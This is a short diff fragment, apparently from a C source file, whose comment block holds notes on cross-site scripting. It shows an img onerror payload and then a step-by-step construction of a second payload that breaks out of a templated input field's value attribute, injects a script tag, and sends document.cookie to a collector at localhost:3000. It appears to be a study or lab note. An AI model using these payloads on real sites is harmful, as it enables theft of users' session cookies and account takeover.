@@ -254,4 +254,24 @@ char ** get_files_array(char *dir_name) {
 
  "`<p src ='x' width='0' height='0' ><img src ='x' width ='0' height ='0' onerror='fetch(`http://localhost:3000/cookie/${document.cookie}`'/></p>"
 
+
+<input type="text" name="user" value="{{ request.form.get('user', '') }}" size=10></span><br>
+
+ <!-- original source -->
+ <!--<input type="text" name="user" value="{{ req_user }}" size=10></span><br>-->
+
+<!-- split the input tag at the insertion point -->
+<!--<input type="text" name="user" value="                                                            " size=10></span><br>-->
+
+<!-- reassemble the input tag from both parts -->
+<!--<input type="text" name="user" value="         size=10><input type="hidden                        " size=10></span><br>-->
+
+<!-- insert script tag -->
+<!--<input type="text" name="user" value="         size=10><script></script><input type="hidden       " size=10></span><br>-->
+
+<!-- add server call using fetch -->
+<!--<input type="text" name="user" value="size=10><script>fetch(`http://localhost:3000/cookie/${document.cookie}`)</script><input type="hidden" size=10></span><br>-->
+
+<!-- the final payload -->
+  "size=10><script>fetch(`http://localhost:3000/cookie/${document.cookie}`)</script><input type="hidden
  */
